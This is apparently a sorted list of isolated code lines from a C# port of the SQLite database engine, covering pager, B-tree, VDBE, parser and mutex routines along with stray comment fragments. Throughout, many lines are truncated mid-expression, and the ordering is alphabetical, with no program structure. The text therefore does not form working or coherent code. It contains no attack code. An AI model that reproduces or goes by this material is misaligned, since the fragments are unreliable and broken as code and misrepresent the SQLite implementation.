        public u8 orphanTrigger
        public void CloseDatabase()
        public void ExecuteNonQuery( String query )
        public void OpenDatabase( String DatabaseName )
        pzErrMsg = initData.pzErrMsg
        pzErrMsg = pParse.zErrMsg
        pzErrMsg = sqlite3_errmsg( db )
        pzErrMsg = zErrmsg
        pzOriginCol = zOriginCol
        pzOriginDb = zOriginDb
        pzOriginTab = zOriginTab
        pzTail = pParse.zTail == null 
        r = -( r 
        r = cntNew[i - 1] - 1
        r = nKey1 - nKey2
        r1 = sqlite3GetTempReg( pParse )
        rc = -rc
        rc = 1
        rc = 1 - rc
        rc = SQLITE_BUSY
        rc = SQLITE_CORRUPT
        rc = SQLITE_DONE
        rc = SQLITE_ERROR
        rc = SQLITE_FULL
        rc = SQLITE_INTERNAL
        rc = SQLITE_MISUSE
        rc = SQLITE_NOMEM
        rc = SQLITE_NOTADB
        rc = SQLITE_OK
        rc = SQLITE_READONLY
        rc = SQLITE_ROW
        rc = balance(pCur)
        rc = btreeInitPage(pTo)
        rc = btreeInitPage(ppPage)
        rc = ctx.isError
        rc = db.errCode = p.rc
        rc = db.xCommitCallback( db.pCommitArg )
        rc = defragmentPage(pPage)
        rc = initData.rc
        rc = moveToRightmost(pCur)
        rc = openSubJournal( pPager )
        rc = pId.pMethods.xClose( pId )
        rc = pMem1.n - pMem2.n
        rc = pPager.errCode
        rc = pager_open_journal( pPager )
        rc = pager_write( pDbPage )
        rc = pager_write_pagelist( pPg )
        rc = pager_write_pagelist( sqlite3PcacheDirtyList( pPager.pPCache ) )
        rc = setChildPtrmaps(pDbPage)
        rc = sqlite3BtreeCommit( pTemp )
        rc = sqlite3BtreeCommitPhaseTwo(p)
        rc = sqlite3PagerCommitPhaseTwo(pBt.pPager)
        rc = sqlite3PagerWrite((ppPage).pDbPage)
        rc = sqlite3PagerWrite(pLeaf.pDbPage)
        rc = sqlite3PagerWrite(pPage.pDbPage)
        rc = sqlite3PagerWrite(pPage1.pDbPage)
        rc = sqlite3PagerWrite(pPtrPage.pDbPage)
        rc = sqlite3PcacheInitialize()
        rc = sqlite3VdbeExec( p )
        rc = sqlite3VdbeFinalize( v )
        rc = sqlite3VdbeList( p )
        rc = sqlite3VdbeReset( p )
        rc = sqlite3VdbeReset( v )
        rc = subjournalPage( pPg )
        rc = syncJournal( pPager )
        rc = true
        rc = writeJournalHdr( pPager )
        rc2 = sqlite3PagerRollback(pBt.pPager)
        readOnly = ( fout 
        readOnly = ( vfsFlags 
        realnum = 1
        ref db.aDb[1].pBt )
        ref pCur.info )
        reg1 = pParse.regRowid = 
        reg2 = pParse.regRoot = 
        reg3 = 
        regEof = 
        regF2 = regFields 
        regFields = iMem 
        regFromSelect = dest.iMem
        regLimitA )
        regLimitA = 
        regLimitA = regLimitB = 0
        regLimitB = 
        regNewRowid
        regPrev = 0
        regR = sqlite3GetTempReg( pParse )
        regRec = regCol 
        regRec = sqlite3GetTempReg( pParse )
        regRow = sqlite3GetTempReg( pParse )
        regRowCount = 
        regRowSet = 
        regRowid
        regRowid = sqlite3GetTempReg( pParse )
        regTemp = regRowid = regCol = regFields 
        regTrigRowid = sqlite3GetTempReg( pParse )
        releaseAllSavepoints( pPager )
        releasePage(apNew[i])
        releasePage(apOld[i])
        releasePage(pBt.pPage1)
        releasePage(pChild)
        releasePage(pNew)
        releasePage(pPage)
        releasePage(pPtrPage)
        requestedSortOrder = (u8)( ( pListItem.sortOrder 
        res = 0
        res = getReadLock( pFile )
        res = unlockReadLock( pFile )
        ret
        ret = xFunc( p.aColName[N] )
        return
        return 
        return ( ( p.u.aBitmap[i / BITVEC_SZELEM] 
        return ( aff1 != '
        return ( b != null )
        return ( db.temp_store != 1 )
        return ( db.temp_store == 2 )
        return ( f2 
        return ( pParse.nErr != 0 /
        return ( rc == SQLITE_LOCKED ) 
        return (KeyInfo)MemberwiseClone()
        return (double)0
        return (double)pMem.u.i
        return (i64)r
        return (u32)( ( serial_type - 12 ) / 2 )
        return (u8)atoi( z )
        return -1
        return 0
        return 1
        return 2
        return 3
        return 4
        return 5
        return 6
        return 7
        return 8
        return 9
        return SQLITE_AFF_NONE
        return SQLITE_BUSY
        return SQLITE_CORRUPT
        return SQLITE_CORRUPT_BKPT()
        return SQLITE_DONE
        return SQLITE_EMPTY
        return SQLITE_ERROR
        return SQLITE_FULL
        return SQLITE_IOERR_READ
        return SQLITE_IOERR_SHORT_READ
        return SQLITE_IOERR_TRUNCATE
        return SQLITE_LOCKED_SHAREDCACHE
        return SQLITE_MISUSE
        return SQLITE_NOMEM
        return SQLITE_OK
        return SQLITE_RANGE
        return SQLITE_READONLY
        return SQLITE_TOOBIG
        return UpperToLower[zLeft[a]] - UpperToLower[zRight[b]]
        return WHERE_ORDERBY_MAX
        return WHERE_ORDERBY_MIN
        return WRC_Abort
        return WRC_Continue
        return WRC_Prune
        return aMsg[rc]
        return aSize[serial_type]
        return btreeRestoreCursorPosition( pCur )
        return c != '
        return cp
        return db.lookaside.sz
        return doubleToInt64( pMem.r )
        return false
        return len
        return mask
        return minInt
        return n > p.db.aLimit[SQLITE_LIMIT_LENGTH]
        return nByte
        return null
        return old_data
        return p
        return p.aOp[addr]
        return p.zBLOB
        return pB == pA
        return pBest
        return pColl[enc]
        return pCur.skipNext
        return pExpr.pTab.aCol[j].affinity
        return pLeft
        return pMem.r
        return pMem.u.i
        return pNew
        return pPager.errCode
        return pRight
        return pVal.z
        return rc
        return sqlite3AffinityType( pExpr.u.zToken )
        return sqlite3ErrStr( SQLITE_MISUSE )
        return sqlite3ErrStr( SQLITE_NOMEM )
        return sqlite3ExprAffinity( pExpr.x.pSelect.pEList.a[0].pExpr )
        return sqlite3GlobalConfig.m.xSize( p )
        return sqlite3Malloc( nBytes )
        return sqlite3_errcode( db )
        return sqlite3_value_text( pVal ) == null 
        return true
        return val
        return value
        return yy_action[i]
        return yy_default[stateno]
        return z2 == null
        return zBuf
        return zBuf.ToString()
        return zInLength - ( zIn[zTerm - 1] == 0 
        return z[0] - '0'
        rowSetSort( p )
        s = 0
        s = s >> 11
        s = s >> 18
        s = s >> 4
        sAggInfo.nAccumulator = sAggInfo.nColumn
        sAggInfo.nSortingColumn = pGroupBy != null 
        sAggInfo.pGroupBy = pGroupBy
        sCheck.anRef[i] = 1
        sEnd.z = sEnd.z.Substring( sEnd.n )
        sLastToken = SaveBuf[nested].sLastToken
        sLastToken = new Token()
        sNC = new NameContext()
        sNC.allowAgg = 1
        sNC.isCheck = 1
        sNC.pAggInfo = sAggInfo
        sNC.pEList = p.pEList
        sNC.pNext = null
        sNC.pNext = pOuterNC
        sNC.pParse = pParse
        sNC.pSrcList = p.pSrc
        sNC.pSrcList = pTabList
        sNC.pSrcList = sSrc
        sNameToken = SaveBuf[nested].sNameToken
        sNameToken = new Token()
        sSrc = new SrcList()
        sSrc.a = new SrcList_item[1]
        sSrc.a[0] = new SrcList_item()
        sSrc.a[0].iCursor = -1
        sSrc.a[0].pTab = p
        sSrc.a[0].zName = p.zName
        sSrc.nSrc = 1
        schemaIsValid( pParse )
        scratchAllocOut = 0
        sectorSize = 0
        selectOpName( p.op ) )
        set
        sgn = 
        sgn = -1
        sharedLockByte = 0
        size = (int)meta[BTREE_DEFAULT_CACHE_SIZE - 1]
        somewhat by saying that the terms of the ORDER BY clause must
        sortOrderMask = 0
        sortOrderMask = 1
        spaceLeft -= n
        sqlite3 db
        sqlite3 db = p.db
        sqlite3 db = pParse.db
        sqlite3 db = pWC.pParse.db
        sqlite3 db = p[0].db
        sqlite3 db = sqlite3VdbeDb( v )
        sqlite3 db = sqlite3_context_db_handle( context )
        sqlite3 db = v.db
        sqlite3Autoext.aExt = null
        sqlite3Autoext.nExt = 0
        sqlite3AutoincrementEnd( pParse )
        sqlite3BackupRestart( pPager.pBackup )
        sqlite3BeginBenignMalloc()
        sqlite3BitvecDestroy( ref pPager.aSavepoint[ii].pInSavepoint )
        sqlite3BitvecDestroy( ref pPager.pInJournal )
        sqlite3BtreeClearCursor(p)
        sqlite3BtreeClearCursor(pCur)
        sqlite3BtreeClose( ref  pCx.pBt )
        sqlite3BtreeClose( ref db.aDb[1].pBt )
        sqlite3BtreeClose( ref pDb.pBt )
        sqlite3BtreeCloseCursor( pCx.pCursor )
        sqlite3BtreeCommit( pDb.pBt )
        sqlite3BtreeEnter(p)
        sqlite3BtreeEnter(pBtree)
        sqlite3BtreeEnterAll( db )
        sqlite3BtreeLeave(p)
        sqlite3BtreeLeave(pBtree)
        sqlite3BtreeLeaveAll( db )
        sqlite3BtreeMutexArrayLeave( p.aMutex )
        sqlite3BtreePager( p.pSrc ).pBackup = p.pNext
        sqlite3CommitInternalChanges( db )
        sqlite3ConnectionUnlocked( db )
        sqlite3DefaultRowEst( pIdx )
        sqlite3DeleteIndex( pIndex )
        sqlite3DeleteTable( ref p )
        sqlite3DeleteTable( ref pItem.pTab )
        sqlite3DeleteTable( ref pParse.pNewTable )
        sqlite3DeleteTable( ref pTab )
        sqlite3Dequote( ref zName )
        sqlite3EndBenignMalloc()
        sqlite3Error(
        sqlite3ErrorClear( pParse )
        sqlite3ExpirePreparedStatements( db )
        sqlite3ExprCacheClear( pParse )
        sqlite3GlobalConfig.inProgress = 0
        sqlite3GlobalConfig.inProgress = 1
        sqlite3GlobalConfig.isInit = 0
        sqlite3GlobalConfig.isMallocInit = 0
        sqlite3GlobalConfig.isMallocInit = 1
        sqlite3GlobalConfig.m.xFree( ref  p )
        sqlite3GlobalConfig.m.xShutdown( sqlite3GlobalConfig.m.pAppData )
        sqlite3GlobalConfig.nPage -= overhead
        sqlite3GlobalConfig.nRefInitMutex
        sqlite3GlobalConfig.pInitMutex = null
        sqlite3GlobalConfig.pPage = null
        sqlite3GlobalConfig.pScratch = null
        sqlite3GlobalConfig.pcache.xDestroy( ref pCache.pCache )
        sqlite3GlobalConfig.pcache.xShutdown( sqlite3GlobalConfig.pcache.pArg )
        sqlite3GlobalConfig.szPage = 0
        sqlite3GlobalConfig.szScratch = 0
        sqlite3GlobalFunctions = new FuncDefHash()
        sqlite3HashClear( pH )
        sqlite3HashInit( p.idxHash )
        sqlite3HashInit( p.tblHash )
        sqlite3HashInit( p.trigHash )
        sqlite3MallocAlarm( nFull )
        sqlite3MemSetDefault()
        sqlite3MutexEnd()
        sqlite3OsClose( pMaster )
        sqlite3OsClose( pPager.fd )
        sqlite3OsClose( pPager.jfd )
        sqlite3OsClose( pPager.sjfd )
        sqlite3OsCloseFree( pMaster )
        sqlite3PCacheSetDefault()
        sqlite3PagerClose(pBt.pPager)
        sqlite3PagerRef(pPage.pDbPage)
        sqlite3PagerRollback( pPager )
        sqlite3PagerUnref( pDestPg )
        sqlite3PagerUnref( pNew )
        sqlite3PagerUnref( pPgHdr )
        sqlite3PagerUnref(pOvflPage)
        sqlite3PagerUnref(pPage.pDbPage)
        sqlite3PcacheCleanAll( pPager.pPCache )
        sqlite3PcacheClear( pPager.pPCache )
        sqlite3PcacheClearSyncFlags( pPager.pPCache )
        sqlite3PcacheDrop( pPg )
        sqlite3PcacheDrop( pPgOld )
        sqlite3PcacheMakeClean( p )
        sqlite3PcacheMakeClean( pPg )
        sqlite3PcacheMakeDirty( pPg )
        sqlite3PcacheMakeDirty( pPgHdr )
        sqlite3PcacheRelease( pPg )
        sqlite3PcacheShutdown()
        sqlite3PrintExpr( p.pHaving )
        sqlite3PrintExpr( p.pLeft )
        sqlite3PrintExpr( p.pRight )
        sqlite3PrintExpr( p.pWhere )
        sqlite3PrintExpr( pList.a[i].pExpr )
        sqlite3PrintExprList( p.pGroupBy )
        sqlite3PrintExprList( p.pOrderBy )
        sqlite3PrngType cp = (sqlite3PrngType)MemberwiseClone()
        sqlite3RegisterGlobalFunctions()
        sqlite3RowSetClear( pMem.u.pRowSet )
        sqlite3SafetyOff( db )
        sqlite3SafetyOn( db )
        sqlite3ValueFree( ref db.pErr )
        sqlite3ValueFree( ref pVal )
        sqlite3VdbeDelete( ref pParse.pVdbe )
        sqlite3VdbeDeleteUnpackedRecord(pIdxKey)
        sqlite3VdbeFinalize( pParse.pVdbe )
        sqlite3VdbeMemExpandBlob( p )
        sqlite3VdbeMemIntegerify( pMem )
        sqlite3VdbeMemNulTerminate( pRec )
        sqlite3VdbeMemNulTerminate( pVal )
        sqlite3VdbeMemRelease( p.aVar[i] )
        sqlite3VdbeMemRelease( pMem )
        sqlite3VdbeMemRelease( pRes )
        sqlite3VdbeMemSetNull( pMem )
        sqlite3VdbeMutexArrayEnter( p )
        sqlite3VdbePrintSql( p )
        sqlite3VtabCommit( db )
        sqlite3VtabLock( _p4.pVtab )
        sqlite3WhereBegin(<term>)
        sqlite3WhereEnd( pWInfo )
        sqlite3WhereEnd()
        sqlite3_close( db )
        sqlite3_context ctx = new sqlite3_context()
        sqlite3_file pMaster = null
        sqlite3_finalize( ref ppStmt )
        sqlite3_fullsync_count
        sqlite3_like_count.iValue
        sqlite3_max_blobsize.iValue = p.n
        sqlite3_mutex mutex = sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MASTER )
        sqlite3_mutex_enter( db.mutex )
        sqlite3_mutex_enter( mem0.mutex )
        sqlite3_mutex_enter( mutex )
        sqlite3_mutex_enter( p.db.mutex )
        sqlite3_mutex_enter( p.pDestDb.mutex )
        sqlite3_mutex_enter( pVm.db.mutex )
        sqlite3_mutex_enter( sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MASTER ) )
        sqlite3_mutex_enter( v.db.mutex )
        sqlite3_mutex_free( ref  sqlite3GlobalConfig.pInitMutex )
        sqlite3_mutex_leave( db.mutex )
        sqlite3_mutex_leave( mem0.mutex )
        sqlite3_mutex_leave( mutex )
        sqlite3_mutex_leave( p.db.mutex )
        sqlite3_mutex_leave( p.pDestDb.mutex )
        sqlite3_mutex_leave( sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MASTER ) )
        sqlite3_mutex_leave( v.db.mutex )
        sqlite3_mutex_leave(mutexOpen)
        sqlite3_os_end()
        sqlite3_pcache p
        sqlite3_release_memory( overage )
        sqlite3_reset_auto_extension()
        sqlite3_result_error_nomem( context )
        sqlite3_result_error_toobig( context )
        sqlite3_result_error_toobig( pCtx )
        sqlite3_search_count.iValue
        sqlite3_value pVal = null
        sqlite3_value pValue = new sqlite3_value()
        sqlite3_value[] argv1 = new sqlite3_value[argc - 1]
        sqlite3_vfs p = vfsList
        sqlite3_vfs pVfs = db.pVfs
        sqlite3_vfs pVfs = pPager.pVfs
        srcTab = -1
        start = sqlite3VdbeCurrentAddr( v )
        start:
        startEq = ( null == pRangeStart 
        start_constraints = ( pRangeStart != null 
        state = trans[state][token]
        static extern IntPtr GetCurrentProcess()
        static void Main(string[] args)
        string bDummy = null
        string pz
        string sDummy = null
        string z
        string z = db.aDb[i].zName
        string z = pExpr.u.zToken
        string z = pIndex.azColl[i]
        string z = pOp.p4.z
        string zCol = pE.u.zToken
        string zColName = pListItem.zName
        string zColl
        string zErr
        string zEsc = sqlite3_value_text( argv[2] )
        string zExternal = zName
        string zFmt = sqlite3_value_text( argv[0] )
        string zIndex = pFrom.zIndex
        string zMainFile = sqlite3BtreeGetFilename( db.aDb[0].pBt )
        string zMsg = isView != 0 
        string zName = pColl.zName
        string zPrefix
        string zSql
        string zSqlCopy
        string zStmt
        string zToken = pOrig.u.zToken
        string zType
        string[] azColName = new string[] {
        string[] azType = new string[]  {
        string[] azVals = null
        subquery does not have both an ORDER BY and a LIMIT clause.
        subtotal 
        surplus = (int)(minLocal 
        switch ( onError )
        switch ( op )
        switch ( p4type )
        switch ( pOp.opcode )
        switch ( pTriggerStep.op )
        switch ( tokenType )
        switch ( xtype )
        switch ( zSql[zIdx] )
        sz = ROUNDDOWN8( sz )
        sz = info.nData
        szHdr1--
        szNew[i - 1] = szLeft
        szNew[i] = szRight
        table is empty.
        target = new Token()
        tempFile = 1
        termSortOrder = iSortOrder 
        testcase( ( p.selFlags 
        testcase( i == 0 )
        testcase( i == 1 )
        testcase( i == db.aLimit[SQLITE_LIMIT_VARIABLE_NUMBER] )
        testcase( i == db.aLimit[SQLITE_LIMIT_VARIABLE_NUMBER] - 1 )
        testcase( idxNew1 == 0 )
        testcase( idxNew2 == 0 )
        testcase( j == 0 
        testcase( n == (u64)( zBuf.Length - 1 ) )
        testcase( n == (u64)db.aLimit[SQLITE_LIMIT_LENGTH] 
        testcase( n == (u64)db.aLimit[SQLITE_LIMIT_LENGTH] )
        testcase( n == (u64)zBuf.Length )
        testcase( n == BMS - 1 )
        testcase( nBytes == mxLen 
        testcase( nBytes == mxLen )
        testcase( op == OP_IdxGE )
        testcase( op == OP_IdxLT )
        testcase( op == OP_Last )
        testcase( op == OP_Noop )
        testcase( op == OP_Rewind )
        testcase( op == OP_SeekGe )
        testcase( op == OP_SeekGt )
        testcase( op == OP_SeekLe )
        testcase( op == OP_SeekLt )
        testcase( p.tooBig )
        testcase( pCol.affinity == SQLITE_AFF_INTEGER )
        testcase( pCol.affinity == SQLITE_AFF_NONE )
        testcase( pCol.affinity == SQLITE_AFF_NUMERIC )
        testcase( pCol.affinity == SQLITE_AFF_REAL )
        testcase( pCol.affinity == SQLITE_AFF_TEXT )
        testcase( pLevel.plan.wsFlags 
        testcase( pRangeEnd != null 
        testcase( pRangeStart != null 
        testcase( pTerm.eOperator 
        testcase( pTerm.wtFlags 
        testcase( rc != SQLITE_OK )
        testcase(cbrk 
        testcase(nSize == pPage.maxLocal 
        testcase(nSize == pPage.maxLocal)
        testcase(pPage.nCell == MX_CELL(pBt))
        testcase(pc 
        testcase(pc == iCellFirst)
        testcase(pc == iCellLast)
        testcase(surplus == maxLocal 
        testcase(surplus == maxLocal)
        the parent query:
        this._base = _base
        this._yyParser = pointer_to_yyParser
        this._yyidx = yyidx
        this.aPageFree = aPageFree
        this.aScratchFree = aScratchFree
        this.affinity = '
        this.affinity = affinity
        this.alarmArg = alarmArg
        this.alarmBusy = alarmBusy
        this.alarmCallback = alarmCallback
        this.alarmThreshold = alarmThreshold
        this.argType = argType
        this.bCoreMutex = bCoreMutex != 0
        this.bFullMutex = bFullMutex
        this.bMemstat = bMemstat != 0
        this.charset = charset
        this.code = code
        this.db = db
        this.eDest = 0
        this.eDest = eDest
        this.eTextRep = eTextRep
        this.enc = enc
        this.flags = 0
        this.flags = flags
        this.flags = iflags
        this.fmttype = fmttype
        this.i = i
        this.iBatch = 0
        this.iKey = 0
        this.iMem = 0
        this.iMem = iMem
        this.iParm = 0
        this.iParm = iParm
        this.iPrefEnc = iPrefEnc
        this.iVersion = iVersion
        this.inProgress = inProgress
        this.isInit = isInit
        this.isMallocInit = isMallocInit
        this.isSorted = true
        this.lhs = lhs
        this.m = m
        this.mask = mask
        this.matchAll = matchAll
        this.matchOne = matchOne
        this.matchSet = matchSet
        this.mnReq = mnReq
        this.mutex = mutex
        this.mxParserStack = mxParserStack
        this.mxPathname = mxPathname
        this.mxReq = mxReq
        this.mxStrlen = mxStrlen
        this.n = 0
        this.n = n
        this.nArg = nArg
        this.nChar = nChar
        this.nFresh = N
        this.nHeap = nHeap
        this.nLookaside = nLookaside
        this.nMem = 0
        this.nMem = nMem
        this.nPage = nPage
        this.nPageFree = nPageFree
        this.nRef = 0
        this.nRefInitMutex = nRefInitMutex
        this.nScratch = nScratch
        this.nScratchFree = nScratchFree
        this.needCollSeq = needCollSeq
        this.noCase = noCase
        this.nrhs = nrhs
        this.opcode = opcode
        this.p1 = p1
        this.p2 = p2
        this.p3 = p3
        this.pAppData = pAppData
        this.pArg = pArg
        this.pCache = null
        this.pChunk = null
        this.pData = null
        this.pDirty = null
        this.pDirtyNext = null
        this.pDirtyPrev = null
        this.pEntry = null
        this.pExtra = null
        this.pFresh = new RowSetEntry[N]
        this.pHash = pHash
        this.pHeap = pHeap
        this.pInitMutex = pInitMutex
        this.pLast = null
        this.pMaskSet.CopyTo( wc.pMaskSet )
        this.pNext = null
        this.pNext = pNext
        this.pPage = pPage
        this.pPager = null
        this.pPgHdr.Clear()
        this.pPgHdr1 = null
        this.pScratch = pScratch
        this.pTree = null
        this.pUserData = arg
        this.pUserData = iArg
        this.pUserData = pUserData
        this.pcache = pcache
        this.pgno = 0
        this.prefix = prefix
        this.sharedCacheEnabled = sharedCacheEnabled
        this.szLookaside = szLookaside
        this.szOsFile = szOsFile
        this.szPage = szPage
        this.szScratch = szScratch
        this.type = type
        this.xAccess = xAccess
        this.xBenignBegin = xBenignBegin
        this.xBenignEnd = xBenignEnd
        this.xCachesize = xCachesize
        this.xCheckReservedLock = xCheckReservedLock
        this.xClose = xClose
        this.xCreate = xCreate
        this.xCurrentTime = xCurrentTime
        this.xDelete = xDelete
        this.xDestroy = xDestroy
        this.xDeviceCharacteristics = xDeviceCharacteristics
        this.xDlClose = xDlClose
        this.xDlError = xDlError
        this.xDlOpen = xDlOpen
        this.xDlSym = xDlSym
        this.xFetch = xFetch
        this.xFileControl = xFileControl
        this.xFileSize = xFileSize
        this.xFinalize = null
        this.xFinalize = xFinal
        this.xFinalize = xFinalize
        this.xFree = xFree
        this.xFullPathname = xFullPathname
        this.xFunc = null
        this.xFunc = xFunc
        this.xGetLastError = xGetLastError
        this.xInit = xInit
        this.xLock = xLock
        this.xMalloc = xMalloc
        this.xMutexAlloc = xMutexAlloc
        this.xMutexEnd = xMutexEnd
        this.xMutexEnter = xMutexEnter
        this.xMutexFree = xMutexFree
        this.xMutexHeld = xMutexHeld
        this.xMutexInit = xMutexInit
        this.xMutexLeave = xMutexLeave
        this.xMutexNotheld = xMutexNotheld
        this.xMutexTry = xMutexTry
        this.xOpen = xOpen
        this.xPagecount = xPagecount
        this.xRandomness = xRandomness
        this.xRead = xRead
        this.xRealloc = xRealloc
        this.xRekey = xRekey
        this.xRoundup = xRoundup
        this.xSectorSize = xSectorSize
        this.xShutdown = xShutdown
        this.xSize = xSize
        this.xSleep = xSleep
        this.xStep = null
        this.xStep = xStep
        this.xSync = xSync
        this.xTruncate = xTruncate
        this.xUnlock = xUnlock
        this.xUnpin = xUnpin
        this.xWrite = xWrite
        this.z = null
        this.z = z
        this.zName = zName
        tm pTm
        tnum = memRootPage
        tnum = pIndex.tnum
        topOfLoop = sqlite3VdbeCurrentAddr( v )
        tr_tm = TK_BEFORE
        trigStack = SaveBuf[nested].trigStack
        trigStack = null
        try
        type = sqlite3_value_numeric_type( argv[0] )
        u
        u = (ulong)( i < 0 
        u = cf.u
        u16 cellOffset
        u16 iPageSize16
        u16 nFree
        u16 pc
        u16 szOld
        u16 top
        u16 usableSize
        u32 Ref0_1 = 0
        u32 Ref0_2 = 0
        u32 Ref_0 = 0
        u32 bin = i / p.iDivisor
        u32 change_counter
        u32 dummy = 0
        u32 h = BITVEC_HASH( i
        u32 h = iKey % pCache.nHash
        u32 i
        u32 iDest = (u32)( iOff / nDestPgsz ) 
        u32 iPageSize = 0
        u32 iSectorSize = 0
        u32 ii
        u32 j
        u32 meta = 0
        u32 nAlloc = (u32)nByte
        u32 nJRec = 0
        u32 nLeaf
        u32 nPage
        u32 ovflSize = (u32)(pBt.usableSize - 4)
        u32 pg1
        u32 serial_type = 0
        u32 serial_type1
        u32 staticFlag = 0
        u32 sz
        u32[] aiValues = new u32[BITVEC_NINT]
        u32[] aiValues = pBuf
        u64 elapseTime
        u64 n
        u64 u
        u64 v
        u64 v64 = 0
        u8 eType = 0
        u8 enableLookaside = db.lookaside.bEnabled
        u8 hdr
        u8 isInitOrig = pPage.isInit
        u8 jointype = 0
        u8 n
        u8 searchList = 0
        u8[] aFrom = pFrom.aData
        u8[] aTo = pTo.aData
        u8[] data
        u8[] k = new u8[256]
        u8[] pCell
        u8[] pCell = pPage.aOvfl[0].pCell
        u8[] page1 = pPage1.aData
        unlockBtreeIfUnused(pBt)
        unlockReadLock( pFile )
        until we introduced the group_concat() function.
        upr = pPage.nCell - 1
        usableSize = pBt.usableSize
        usableSize = pageSize - page1[20]
        use LIMIT.
        v = ( (u64)s ) << 32 
        v = -v
        v = 0
        v = a
        v = a 
        v = pParse.pVdbe = sqlite3VdbeCreate( pParse.db )
        v = sqlite3GetVdbe( pParse )
        v = v 
        v >>= 7
        v >>= 8
        va_end( ap )
        val = val 
        vals = sqlite3_data_count( pStmt )
        value is omitted unless we are doing an UPDATE that involves a
        vfsFlags = ( vfsFlags 
        vfsList = pVfs
        vfsList = pVfs.pNext
        vfsList.pNext = pVfs
        wc.a = (WhereTerm[])this.a.Clone()
        wc.aStatic = (WhereTerm[])this.aStatic.Clone()
        wc.nSlot = this.nSlot
        wc.nTerm = this.nTerm
        wc.op = this.op
        wc.pMaskSet = new WhereMaskSet()
        wc.pParse = this.pParse
        whereClauseClear( pWInfo.pWC )
        while ( ( fs == null ) 
        while ( ( pPage = pp ) != null )
        while ( ( rc = sqlite3Step( v ) ) == SQLITE_SCHEMA
        while ( N-- > 0 )
        while ( cnt < z.Length 
        while ( cnt-- > 0 
        while ( i-- != 0 )
        while ( iz < zIn.Length 
        while ( n-- != 0 )
        while ( p != null )
        while ( p.pNext != null 
        while ( p.u.aHash[h] != 0 )
        while ( pFirst.pPrior != null ) pFirst = pFirst.pPrior
        while ( pInfo != null 
        while ( pSynced != null 
        while ( pTrigger != null )
        while ( pp != p )
        while ( rc == SQLITE_OK 
        while ( sqlite3Isdigit( z[zDx] ) )
        while ( sqlite3Isspace( z[zDx] ) ) zDx
        while ( true )
        while ( zIndex < z.Length 
        while ( z[zDx] == '0' )
        while (((pCell[_pCell
        while (((pCell[_pIter
        while (((pSpace[pOut
        while (i > 0)
        while (iLastPg == PENDING_BYTE_PAGE(pBt) 
        while (pBt.pPage1 == null 
        while (pCur.aiIdx[pCur.iPage] == 0)
        while (pCur.iPage > iCellDepth)
        while (pc > 0)
        while (szRight == 0 
        width = 0
        wms.ix = (int[])this.ix.Clone()
        wms.n = this.n
        wrote = id.fs.Position - wrote
        wsFlags = 0
        wsFlags = WHERE_ROWID_RANGE
        wsdAutoext.aExt[wsdAutoext.nExt] = xInit
        wsdAutoext.nExt
        wsdAutoextInit()
        wsdHooks.xBenignBegin()
        wsdHooks.xBenignEnd()
        wsdPrng.i = 0
        wsdPrng.isInit = true
        wsdPrng.j = 0
        wsdStat.mxValue[op] = wsdStat.nowValue[op]
        x 
        x = 
        x.D = 1
        x.M = 1
        x.Y = 2000
        x.h = 0
        x.m = 0
        x.pList = cf.x.pList == null 
        x.pSelect = cf.x.pSelect == null 
        x.s = 0.0
        x.s = s
        xDelete( ref pAux )
        xIter( pDirty )
        xtype = etINVALID
        y.D = pTm.tm_mday
        y.M = pTm.tm_mon
        y.Y = pTm.tm_year
        y.h = pTm.tm_hour
        y.m = pTm.tm_min
        y.s = pTm.tm_sec
        yColCache p
        yyRuleName[yyruleno])
        yyTokenName[yytos.major])
        yy_accept(yypParser)
        yypParser.yyerrcnt = -1
        yypParser.yyidx = 0
        yypParser.yystack[0] = new yyStackEntry()
        yypParser.yystack[0].major = 0
        yypParser.yystack[0].stateno = 0
        z = pName.z
        z = pTabItem.zAlias
        z = sqlite3_value_text( argv[0] )
        z = sqlite3_value_text( db.pErr )
        z = z.Trim()
        z == zBuf 
        z1 = z2.Length == 0 
        zAlias1 = pTab1.zName
        zAlias2 = pTab2.zName
        zAuthContext = SaveBuf[nested].zAuthContext
        zAuthContext = null
        zBLOB = argv[0].zBLOB
        zBuf.Append( ' ' )
        zBuf.Append( '[' )
        zBuf.Append( ']' )
        zBuf.Append( zCsr )
        zBytes = sqlite3_value_blob( argv[1] )
        zCharSet = null
        zColAff = new StringBuilder( pTab.nCol 
        zDate = zDate.Substring( 1 ).Trim()
        zErr = cnt == 0 
        zFull.Append( zOut )
        zHeader[0] = 0
        zIdx
        zIndex
        zIndex 
        zMaster = new byte[pPager.pVfs.mxPathname 
        zMasterSchema = master_schema
        zMasterSchema = temp_master_schema
        zPathname = new StringBuilder( nPathname 
        zProc = sqlite3_value_text( argv[1] )
        zRandom.Append( (char)zChars[(int)( iRandom % ( zChars.Length - 1 ) )] )
        zRight = ( pValue == null ) 
        zSep = zSep2
        zStmt
        zStmt.Append( zSep )
        zStmt.Append( zType )
        zTab
        zTail = SaveBuf[nested].zTail
        zTail.Length = 0
        zType = azType[pCol.affinity - SQLITE_AFF_TEXT]
        zType = pTab.aCol[iCol].zType
        zUtf8Name = zTmpname.ToString()
        zVal = pExpr.u.zToken.Substring( 2 )
        zVal = sqlite3_value_text( argv[0] )
        z[i
        {
        {                                                     /
        { p.aMem[n] = new Mem()
        { p.aVar[n] = new Mem()
        { rc = 0
        { zOut = zRelative
        { }
        }
        } 
        } /
        } if ( rc != SQLITE_OK )
        } return n
        } while ( !done 
        } while ( dist != 2 
        } while ( rc != SQLITE_OK 
        } while ( rc == SQLITE_BUSY 
        } while ( rc == SQLITE_OK 
        } while ( token != TK_LP 
        } while (pCur.aiIdx[pCur.iPage] >= pPage.nCell)
        } while (searchList != 0)
        }/
       ((i386) 
       (a) The number of pages allocated for the cache is already 
       (a) the number of pages pinned by the cache is greater than
       (b) The number of pages allocated for all purgeable caches is
       (b) the number of pages pinned by the cache is greater than
       ) )
       ---------          ----------
       /
       <Move page X to location Y>
       <shrink database file to Y pages>
       <update nRec field>
       A LIKE B
       A: <loop body>                 
       B: <after the loop>
       CAST => ID 
       DESC => ID 
       EACH => ID 
       FAIL => ID 
       INSERT INTO <table1> SELECT 
       N       number of digits in the integer
       PLAN => ID 
       SELECT 
       SEMI => nothing 
       SQLITE_CREATE_INDEX
       SQLITE_CREATE_TABLE
       SQLITE_CREATE_TEMP_INDEX
       SQLITE_CREATE_TEMP_TABLE
       SQLITE_CREATE_TEMP_TRIGGER
       SQLITE_CREATE_TEMP_VIEW
       SQLITE_CREATE_TRIGGER
